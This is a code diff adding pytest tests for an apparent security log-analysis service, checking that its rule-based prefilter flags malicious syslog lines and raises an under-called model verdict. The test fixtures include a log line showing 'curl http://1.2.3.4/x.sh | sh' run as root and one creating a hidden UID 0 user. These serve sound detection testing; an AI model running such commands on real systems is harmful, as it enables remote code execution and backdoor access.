@@ -98,3 +98,53 @@ def test_healthz_returns_503_when_ollama_is_down(monkeypatch):
 
     assert response.status_code == 503
     assert "unreachable" in response.json()["detail"]
+
+
+# --- /prefilter: rules alone, no model --------------------------------------
+
+def test_prefilter_route_needs_no_model():
+    # No transport stub: if this route touched Ollama the test would fail.
+    log = "Oct  9 16:40:12 db02 sudo:  www-data : USER=root ; COMMAND=/bin/bash -c \"curl http://1.2.3.4/x.sh | sh\""
+    body = client.post("/prefilter", json={"log": log}).json()
+
+    assert body["clean"] is False
+    assert body["severity_floor"] == "critical"
+    assert {s["rule_id"] for s in body["signals"]} == {"R004", "R008"}
+
+
+def test_prefilter_route_reports_clean_benign_logs():
+    body = client.post("/prefilter", json={"log": "Oct  9 09:17:44 web01 systemd[1]: Started Daily apt."}).json()
+
+    assert body["clean"] is True
+    assert body["signals"] == []
+    assert body["severity_floor"] == "info"
+
+
+def test_analyze_includes_the_prefilter_report(monkeypatch):
+    async def fake(log, source=None):
+        return STUB, 100
+
+    monkeypatch.setattr(llm, "analyze", fake)
+    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc, UID=0, GID=0, home=/home/svc"
+    body = client.post("/analyze", json={"log": log}).json()
+
+    assert body["prefilter"]["severity_floor"] == "critical"
+    assert body["prefilter"]["signals"][0]["rule_id"] == "R005"
+
+
+def test_analyze_raises_an_undercalled_model_verdict(monkeypatch):
+    undercalled = STUB.model_copy(deep=True)
+    undercalled.severity = "medium"
+    undercalled.verdict = "suspicious"
+
+    async def fake(log, source=None):
+        return undercalled, 100
+
+    monkeypatch.setattr(llm, "analyze", fake)
+    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc, UID=0, GID=0, home=/home/svc"
+    body = client.post("/analyze", json={"log": log}).json()
+
+    # The rules override the model upward, and say so.
+    assert body["analysis"]["severity"] == "critical"
+    assert body["analysis"]["verdict"] == "malicious"
+    assert body["prefilter"]["applied_floor"] is True
